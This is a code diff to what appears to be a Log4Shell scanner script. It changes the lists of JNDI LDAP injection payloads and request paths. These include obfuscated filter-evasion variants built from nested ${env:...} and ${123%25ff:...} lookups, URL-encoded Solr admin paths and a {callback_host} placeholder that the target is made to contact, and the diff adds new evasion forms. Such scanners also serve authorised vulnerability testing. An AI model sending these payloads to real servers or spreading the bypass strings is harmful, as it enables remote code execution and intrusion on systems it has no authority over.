@@ -55,16 +55,17 @@ default_headers = {
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
 
 protocols = [f"jndi:ldap:",
-            f'${{env:BARFOO:-j}}ndi${{env:BARFOO:-:}}${{env:BARFOO:-l}}dap${{env:BARFOO:-:}}'
-            f'j${{k8s:k5:-ND}}i${{sd:k5:-:}}',
-            f'j${{mAin:\k5:-Nd}}i${{sPrIng:k5:-:}}',
-            f'j${{sYs:k5:-nD}}${{loWer:i${{weB:k5:-:}}}}',
-            f'j${{::-nD}}i${{::-:}}',
-            f'j${{EnV:K5:-nD}}i:ldap:',]
+            #f'${{env:BARFOO:-j}}ndi${{env:BARFOO:-:}}${{env:BARFOO:-l}}dap${{env:BARFOO:-:}}'
+            f'jnd${{123%25ff:-${{123%25ff:-i:}}}}ldap:']
+            # f'j${{mAin:\k5:-Nd}}i${{sPrIng:k5:-:}}',
+            # f'j${{sYs:k5:-nD}}${{loWer:i${{weB:k5:-:}}}}',
+            # f'j${{::-nD}}i${{::-:}}',
+            # f'j${{EnV:K5:-nD}}i:ldap:',]
 
 all_paths = ['/',
-    f'/solr/admin/collections?action=${{jndi:ldap://{{callback_host}}/{{random}}}}',
-    f'/$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//{{callback_host}}/{{random}}%7B'
+    f'/solr/admin/collections?action=${{jndi:ldap:%2F%2F{{callback_host}}/{{random}}}}',
+    f'/$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D%2F%2F{{callback_host}}%2F{{random}}%7B',
+    f'/%24%7Bjnd%24%7B123%2525ff%3A-%24%7B123%2525ff%3A-i%3A%7D%7Dldap%3A%2F%2F{{callback_host}}%2F{{random}}%7D'
 ]
 
 typical_ports = ['443', '80', '81', '7000', '3333', '9800', '8080', '8000', '10000', '8443', '7443', '8880', '8008', '2087', '8172']
@@ -478,7 +479,6 @@ if __name__ == "__main__":
                 except:
                     pass
             counter -= 1
-            cprint(f'PENDING REQUESTS: {counter}', 'grey')
     except KeyboardInterrupt:
         print("\nKeyboardInterrupt Detected.")
         print("Exiting...")
